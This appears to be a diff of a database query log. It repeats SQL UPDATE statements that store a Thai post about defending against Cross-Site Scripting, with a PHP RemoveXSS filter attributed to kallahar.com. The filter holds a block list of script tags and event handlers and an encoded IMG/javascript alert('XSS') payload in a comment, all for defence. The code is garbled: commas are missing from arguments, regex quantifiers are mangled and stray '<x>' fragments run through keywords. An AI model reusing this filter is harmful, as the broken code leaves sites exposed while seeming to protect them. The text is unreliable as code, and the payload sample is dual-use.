+อย่างที่ไม่คาดคิดว่ามันจะร้ายกาจได้ขนาดนี้ ต้องขอบคุณ พี่ด้า Inpross มากนะครับ<br />
+ที่อุตส่าห์นั่งหาสาเหตุกันตั้งนานสองนาน</x></x></p>',content_detail='<p><b>เอาไปเลยครับ sc<x>ript </x></b></p>
+<p>function RemoveXSS($val) {<br />
+&nbsp;&nbsp; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed<br />
+&nbsp;&nbsp; // this prevents some character re-spacing such as &lt;java\\0sc<x>ript&gt;<br />
+&nbsp;&nbsp; // note that you have to handle splits with \\n \\r and \\t later since they *are* allowed in some inputs<br />
+&nbsp;&nbsp; $val = preg_replace(\'/([\\x00-\\x08\\x0b-\\x0c\\x0e-\\x19])/\' \'\' $val);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // straight replacements the user should never need these since they\'re normal characters<br />
+&nbsp;&nbsp; // this prevents like &lt;IMG SRC=&amp;#X40&amp;#X61&amp;#X76&amp;#X61&amp;#X73&amp;#X63&amp;#X72&amp;#X69&amp;#X70&amp;#X74&amp;#X3A &amp;#X61&amp;#X6C&amp;#X65&amp;#X72&amp;#X74&amp;#X28&amp;#X27&amp;#X58&amp;#X53&amp;#X53&amp;#X27&amp;#X29&gt;<br />
+&nbsp;&nbsp; $search = \'abcdefghijklmnopqrstuvwxyz\';<br />
+&nbsp;&nbsp; $search .= \'ABCDEFGHIJKLMNOPQRSTUVWXYZ\';<br />
+&nbsp;&nbsp; $search .= \'1234567890!@#$%^&amp;*()\';<br />
+&nbsp;&nbsp; $search .= \'~`&quot;;:?+/={}[]-_|\\\'\\\\\';<br />
+&nbsp;&nbsp; for ($i = 0; $i &lt; strlen($search); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // ;? matches the ; which is optional<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 0{07} matches any padded zeros which are optional and go up to 8 chars<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#x0040 @ search for the hex values<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#[xX]0{08}\'.dechex(ord($search[$i])).\';?)/i\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#00064 @ 0{07} matches \'0\' zero to seven times<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#0{08}\'.ord($search[$i]).\';?)/\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // now the only remaining whitespace attacks are \\t \\n and \\r<br />
+&nbsp;&nbsp; $ra1 = Array(\'ja<x>vasc<x>ript\' \'vb<x>sc<x>ript\' \'ex<x>pression\' \'ap<x>plet\' \'me<x>ta\' \'xm<x>l\' \'bl<x>ink\' \'li<x>nk\' \'st<x>yle\' \'sc<x>ript\' \'em<x>bed\' \'ob<x>ject\' \'if<x>rame\' \'fr<x>ame\' \'fr<x>ameset\' \'il<x>ayer\' \'la<x>yer\' \'bg<x>sound\' \'ti<x>tle\' \'ba<x>se\');<br />
+&nbsp;&nbsp; $ra2 = Array(\'on<x>abort\' \'on<x>activate\' \'on<x>afterprint\' \'on<x>afterupdate\' \'on<x>beforeactivate\' \'on<x>beforecopy\' \'on<x>beforecut\' \'on<x>beforedeactivate\' \'on<x>beforeeditfocus\' \'on<x>beforepaste\' \'on<x>beforeprint\' \'on<x>beforeunload\' \'on<x>beforeupdate\' \'on<x>blur\' \'on<x>bounce\' \'on<x>cellchange\' \'on<x>change\' \'on<x>click\' \'on<x>contextmenu\' \'on<x>controlselect\' \'on<x>copy\' \'on<x>cut\' \'on<x>dataavailable\' \'on<x>datasetchanged\' \'on<x>datasetcomplete\' \'on<x>dblclick\' \'on<x>deactivate\' \'on<x>drag\' \'on<x>dragend\' \'on<x>dragenter\' \'on<x>dragleave\' \'on<x>dragover\' \'on<x>dragstart\' \'on<x>drop\' \'on<x>error\' \'on<x>errorupdate\' \'on<x>filterchange\' \'on<x>finish\' \'on<x>focus\' \'on<x>focusin\' \'on<x>focusout\' \'on<x>help\' \'on<x>keydown\' \'on<x>keypress\' \'on<x>keyup\' \'on<x>layoutcomplete\' \'on<x>load\' \'on<x>losecapture\' \'on<x>mousedown\' \'on<x>mouseenter\' \'on<x>mouseleave\' \'on<x>mousemove\' \'on<x>mouseout\' \'on<x>mouseover\' \'on<x>mouseup\' \'on<x>mousewheel\' \'on<x>move\' \'on<x>moveend\' \'on<x>movestart\' \'on<x>paste\' \'on<x>propertychange\' \'on<x>readystatechange\' \'on<x>reset\' \'on<x>resize\' \'on<x>resizeend\' \'on<x>resizestart\' \'on<x>rowenter\' \'on<x>rowexit\' \'on<x>rowsdelete\' \'on<x>rowsinserted\' \'on<x>scroll\' \'on<x>select\' \'on<x>selection<x>change\' \'on<x>selectstart\' \'on<x>start\' \'on<x>stop\' \'on<x>submit\' \'on<x>unload\');<br />
+&nbsp;&nbsp; $ra = array_merge($ra1 $ra2);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; $found = true; // keep replacing as long as the previous round replaced something<br />
+&nbsp;&nbsp; while ($found == true) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val_before = $val;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($i = 0; $i &lt; sizeof($ra); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern = \'/\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($j &gt; 0) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(&amp;#[xX]0{08}([9ab]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|(&amp;#0{08}([9|10|13]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \')*\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= $ra[$i][$j];<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'/i\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $replacement = substr($ra[$i] 0 2).\'&lt;x&gt;\'.substr($ra[$i] 2); // add in &lt;&gt; to nerf the tag<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace($pattern $replacement $val); // filter out the hex tags<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($val_before == $val) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no replacements were made so exit the loop<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $found = false;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; return $val;<br />
+} <br />
+&nbsp;</x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></p>
+<p><u><b>ที่มา </b></u>http://kallahar.com/smallprojects/php_xss_filter_function.php</p>' Where content_id = 25 
+16:03:51 :  => Update content SET category_id='1',content_name='มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ',content_summary='<p>มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ<br />
+พอดีไปเจอมาช่วยได้เยอะครับ แต่ไม่แน่ใจว่าครอบคลุมหรือเปล่า<br />
+ตอนแรกผมก็โดน SQL Injection ด้วยและก็มี sc<x>ript บางตัวหลุด<br />
+อย่างที่ไม่คาดคิดว่ามันจะร้ายกาจได้ขนาดนี้ ต้องขอบคุณ พี่ด้า Inpross มากนะครับ<br />
+ที่อุตส่าห์นั่งหาสาเหตุกันตั้งนานสองนาน</x></x></p>',content_detail='<p><b>เอาไปเลยครับ sc<x>ript </x></b></p>
+<p>function RemoveXSS($val) {<br />
+&nbsp;&nbsp; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed<br />
+&nbsp;&nbsp; // this prevents some character re-spacing such as &lt;java\\0sc<x>ript&gt;<br />
+&nbsp;&nbsp; // note that you have to handle splits with \\n \\r and \\t later since they *are* allowed in some inputs<br />
+&nbsp;&nbsp; $val = preg_replace(\'/([\\x00-\\x08\\x0b-\\x0c\\x0e-\\x19])/\' \'\' $val);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // straight replacements the user should never need these since they\'re normal characters<br />
+&nbsp;&nbsp; // this prevents like &lt;IMG SRC=&amp;#X40&amp;#X61&amp;#X76&amp;#X61&amp;#X73&amp;#X63&amp;#X72&amp;#X69&amp;#X70&amp;#X74&amp;#X3A &amp;#X61&amp;#X6C&amp;#X65&amp;#X72&amp;#X74&amp;#X28&amp;#X27&amp;#X58&amp;#X53&amp;#X53&amp;#X27&amp;#X29&gt;<br />
+&nbsp;&nbsp; $search = \'abcdefghijklmnopqrstuvwxyz\';<br />
+&nbsp;&nbsp; $search .= \'ABCDEFGHIJKLMNOPQRSTUVWXYZ\';<br />
+&nbsp;&nbsp; $search .= \'1234567890!@#$%^&amp;*()\';<br />
+&nbsp;&nbsp; $search .= \'~`&quot;;:?+/={}[]-_|\\\'\\\\\';<br />
+&nbsp;&nbsp; for ($i = 0; $i &lt; strlen($search); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // ;? matches the ; which is optional<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 0{07} matches any padded zeros which are optional and go up to 8 chars<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#x0040 @ search for the hex values<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#[xX]0{08}\'.dechex(ord($search[$i])).\';?)/i\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#00064 @ 0{07} matches \'0\' zero to seven times<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#0{08}\'.ord($search[$i]).\';?)/\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // now the only remaining whitespace attacks are \\t \\n and \\r<br />
+&nbsp;&nbsp; $ra1 = Array(\'ja<x>vasc<x>ript\' \'vb<x>sc<x>ript\' \'ex<x>pression\' \'ap<x>plet\' \'me<x>ta\' \'xm<x>l\' \'bl<x>ink\' \'li<x>nk\' \'st<x>yle\' \'sc<x>ript\' \'em<x>bed\' \'ob<x>ject\' \'if<x>rame\' \'fr<x>ame\' \'fr<x>ameset\' \'il<x>ayer\' \'la<x>yer\' \'bg<x>sound\' \'ti<x>tle\' \'ba<x>se\');<br />
+&nbsp;&nbsp; $ra2 = Array(\'on<x>abort\' \'on<x>activate\' \'on<x>afterprint\' \'on<x>afterupdate\' \'on<x>beforeactivate\' \'on<x>beforecopy\' \'on<x>beforecut\' \'on<x>beforedeactivate\' \'on<x>beforeeditfocus\' \'on<x>beforepaste\' \'on<x>beforeprint\' \'on<x>beforeunload\' \'on<x>beforeupdate\' \'on<x>blur\' \'on<x>bounce\' \'on<x>cellchange\' \'on<x>change\' \'on<x>click\' \'on<x>contextmenu\' \'on<x>controlselect\' \'on<x>copy\' \'on<x>cut\' \'on<x>dataavailable\' \'on<x>datasetchanged\' \'on<x>datasetcomplete\' \'on<x>dblclick\' \'on<x>deactivate\' \'on<x>drag\' \'on<x>dragend\' \'on<x>dragenter\' \'on<x>dragleave\' \'on<x>dragover\' \'on<x>dragstart\' \'on<x>drop\' \'on<x>error\' \'on<x>errorupdate\' \'on<x>filterchange\' \'on<x>finish\' \'on<x>focus\' \'on<x>focusin\' \'on<x>focusout\' \'on<x>help\' \'on<x>keydown\' \'on<x>keypress\' \'on<x>keyup\' \'on<x>layoutcomplete\' \'on<x>load\' \'on<x>losecapture\' \'on<x>mousedown\' \'on<x>mouseenter\' \'on<x>mouseleave\' \'on<x>mousemove\' \'on<x>mouseout\' \'on<x>mouseover\' \'on<x>mouseup\' \'on<x>mousewheel\' \'on<x>move\' \'on<x>moveend\' \'on<x>movestart\' \'on<x>paste\' \'on<x>propertychange\' \'on<x>readystatechange\' \'on<x>reset\' \'on<x>resize\' \'on<x>resizeend\' \'on<x>resizestart\' \'on<x>rowenter\' \'on<x>rowexit\' \'on<x>rowsdelete\' \'on<x>rowsinserted\' \'on<x>scroll\' \'on<x>select\' \'on<x>selection<x>change\' \'on<x>selectstart\' \'on<x>start\' \'on<x>stop\' \'on<x>submit\' \'on<x>unload\');<br />
+&nbsp;&nbsp; $ra = array_merge($ra1 $ra2);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; $found = true; // keep replacing as long as the previous round replaced something<br />
+&nbsp;&nbsp; while ($found == true) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val_before = $val;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($i = 0; $i &lt; sizeof($ra); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern = \'/\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($j &gt; 0) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(&amp;#[xX]0{08}([9ab]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|(&amp;#0{08}([9|10|13]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \')*\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= $ra[$i][$j];<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'/i\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $replacement = substr($ra[$i] 0 2).\'&lt;x&gt;\'.substr($ra[$i] 2); // add in &lt;&gt; to nerf the tag<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace($pattern $replacement $val); // filter out the hex tags<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($val_before == $val) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no replacements were made so exit the loop<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $found = false;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; return $val;<br />
+} <br />
+&nbsp;</x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></p>
+<p><u><b>ที่มา </b></u>http://kallahar.com/smallprojects/php_xss_filter_function.php</p>' Where content_id = 25 
+16:03:25 :  => Update content SET category_id='1',content_name='มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ',content_summary='<p>มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ<br />
+พอดีไปเจอมาช่วยได้เยอะครับ แต่ไม่แน่ใจว่าครอบคลุมหรือเปล่า<br />
+ตอนแรกผมก็โดน SQL Injection ด้วยและก็มี sc<x>ript บางตัวหลุด<br />
+อย่างที่ไม่คาดคิดว่ามันจะร้ายกาจได้ขนาดนี้ ต้องขอบคุณ พี่ด้า Inpross มากนะครับ<br />
+ที่อุตส่าห์นั่งหาสาเหตุกันตั้งนานสองนาน</x></x></p>',content_detail='<p><b>เอาไปเลยครับ sc<x>ript </x></b></p>
+<p>function RemoveXSS($val) {<br />
+&nbsp;&nbsp; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed<br />
+&nbsp;&nbsp; // this prevents some character re-spacing such as &lt;java\\0sc<x>ript&gt;<br />
+&nbsp;&nbsp; // note that you have to handle splits with \\n \\r and \\t later since they *are* allowed in some inputs<br />
+&nbsp;&nbsp; $val = preg_replace(\'/([\\x00-\\x08\\x0b-\\x0c\\x0e-\\x19])/\' \'\' $val);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // straight replacements the user should never need these since they\'re normal characters<br />
+&nbsp;&nbsp; // this prevents like &lt;IMG SRC=&amp;#X40&amp;#X61&amp;#X76&amp;#X61&amp;#X73&amp;#X63&amp;#X72&amp;#X69&amp;#X70&amp;#X74&amp;#X3A &amp;#X61&amp;#X6C&amp;#X65&amp;#X72&amp;#X74&amp;#X28&amp;#X27&amp;#X58&amp;#X53&amp;#X53&amp;#X27&amp;#X29&gt;<br />
+&nbsp;&nbsp; $search = \'abcdefghijklmnopqrstuvwxyz\';<br />
+&nbsp;&nbsp; $search .= \'ABCDEFGHIJKLMNOPQRSTUVWXYZ\';<br />
+&nbsp;&nbsp; $search .= \'1234567890!@#$%^&amp;*()\';<br />
+&nbsp;&nbsp; $search .= \'~`&quot;;:?+/={}[]-_|\\\'\\\\\';<br />
+&nbsp;&nbsp; for ($i = 0; $i &lt; strlen($search); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // ;? matches the ; which is optional<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 0{07} matches any padded zeros which are optional and go up to 8 chars<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#x0040 @ search for the hex values<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#[xX]0{08}\'.dechex(ord($search[$i])).\';?)/i\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#00064 @ 0{07} matches \'0\' zero to seven times<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#0{08}\'.ord($search[$i]).\';?)/\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // now the only remaining whitespace attacks are \\t \\n and \\r<br />
+&nbsp;&nbsp; $ra1 = Array(\'ja<x>vasc<x>ript\' \'vb<x>sc<x>ript\' \'ex<x>pression\' \'ap<x>plet\' \'me<x>ta\' \'xm<x>l\' \'bl<x>ink\' \'li<x>nk\' \'st<x>yle\' \'sc<x>ript\' \'em<x>bed\' \'ob<x>ject\' \'if<x>rame\' \'fr<x>ame\' \'fr<x>ameset\' \'il<x>ayer\' \'la<x>yer\' \'bg<x>sound\' \'ti<x>tle\' \'ba<x>se\');<br />
+&nbsp;&nbsp; $ra2 = Array(\'on<x>abort\' \'on<x>activate\' \'on<x>afterprint\' \'on<x>afterupdate\' \'on<x>beforeactivate\' \'on<x>beforecopy\' \'on<x>beforecut\' \'on<x>beforedeactivate\' \'on<x>beforeeditfocus\' \'on<x>beforepaste\' \'on<x>beforeprint\' \'on<x>beforeunload\' \'on<x>beforeupdate\' \'on<x>blur\' \'on<x>bounce\' \'on<x>cellchange\' \'on<x>change\' \'on<x>click\' \'on<x>contextmenu\' \'on<x>controlselect\' \'on<x>copy\' \'on<x>cut\' \'on<x>dataavailable\' \'on<x>datasetchanged\' \'on<x>datasetcomplete\' \'on<x>dblclick\' \'on<x>deactivate\' \'on<x>drag\' \'on<x>dragend\' \'on<x>dragenter\' \'on<x>dragleave\' \'on<x>dragover\' \'on<x>dragstart\' \'on<x>drop\' \'on<x>error\' \'on<x>errorupdate\' \'on<x>filterchange\' \'on<x>finish\' \'on<x>focus\' \'on<x>focusin\' \'on<x>focusout\' \'on<x>help\' \'on<x>keydown\' \'on<x>keypress\' \'on<x>keyup\' \'on<x>layoutcomplete\' \'on<x>load\' \'on<x>losecapture\' \'on<x>mousedown\' \'on<x>mouseenter\' \'on<x>mouseleave\' \'on<x>mousemove\' \'on<x>mouseout\' \'on<x>mouseover\' \'on<x>mouseup\' \'on<x>mousewheel\' \'on<x>move\' \'on<x>moveend\' \'on<x>movestart\' \'on<x>paste\' \'on<x>propertychange\' \'on<x>readystatechange\' \'on<x>reset\' \'on<x>resize\' \'on<x>resizeend\' \'on<x>resizestart\' \'on<x>rowenter\' \'on<x>rowexit\' \'on<x>rowsdelete\' \'on<x>rowsinserted\' \'on<x>scroll\' \'on<x>select\' \'on<x>selection<x>change\' \'on<x>selectstart\' \'on<x>start\' \'on<x>stop\' \'on<x>submit\' \'on<x>unload\');<br />
+&nbsp;&nbsp; $ra = array_merge($ra1 $ra2);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; $found = true; // keep replacing as long as the previous round replaced something<br />
+&nbsp;&nbsp; while ($found == true) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val_before = $val;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($i = 0; $i &lt; sizeof($ra); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern = \'/\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($j &gt; 0) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(&amp;#[xX]0{08}([9ab]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|(&amp;#0{08}([9|10|13]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \')*\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= $ra[$i][$j];<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'/i\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $replacement = substr($ra[$i] 0 2).\'&lt;x&gt;\'.substr($ra[$i] 2); // add in &lt;&gt; to nerf the tag<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace($pattern $replacement $val); // filter out the hex tags<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($val_before == $val) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no replacements were made so exit the loop<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $found = false;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; return $val;<br />
+} <br />
+&nbsp;</x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></p>
+<p><u><b>ที่มา </b></u>http://kallahar.com/smallprojects/php_xss_filter_function.php</p>' Where content_id = 25 
+16:03:25 :  => Update content SET category_id='1',content_name='มาป้องกัน Cross-Site scripting อันร้ายกาจกันครับ',content_summary='<p>มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ<br />
+พอดีไปเจอมาช่วยได้เยอะครับ แต่ไม่แน่ใจว่าครอบคลุมหรือเปล่า<br />
+ตอนแรกผมก็โดน SQL Injection ด้วยและก็มี sc<x>ript บางตัวหลุด<br />
+อย่างที่ไม่คาดคิดว่ามันจะร้ายกาจได้ขนาดนี้ ต้องขอบคุณ พี่ด้า Inpross มากนะครับ<br />
+ที่อุตส่าห์นั่งหาสาเหตุกันตั้งนานสองนาน</x></x></p>',content_detail='<p><b>เอาไปเลยครับ sc<x>ript </x></b></p>
+<p>function RemoveXSS($val) {<br />
+&nbsp;&nbsp; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed<br />
+&nbsp;&nbsp; // this prevents some character re-spacing such as &lt;java\\0sc<x>ript&gt;<br />
